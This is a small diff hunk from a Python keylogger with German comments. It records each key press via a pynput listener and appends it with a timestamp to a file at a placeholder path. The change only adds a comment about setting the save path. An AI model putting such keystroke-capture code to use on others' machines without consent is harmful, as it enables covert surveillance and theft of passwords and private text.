@@ -8,7 +8,7 @@ def log(taste):
     monat = t.tm_mon
     minute = t.tm_min
     name = str(tag) + "." + str(monat) + " - " + str(stunde) + ":" + str(minute)
-    f = open(" #HIER PFAD EINFUEGEN ", "a+")
+    f = open(" #HIER PFAD EINFUEGEN ", "a+")        #Hier gewünschten Speicherpfad inkl. dateiformat angeben
     f.write(name + " Inhalt: " + str(taste) + "\n")
  
 with Listener(on_press=log) as listener:
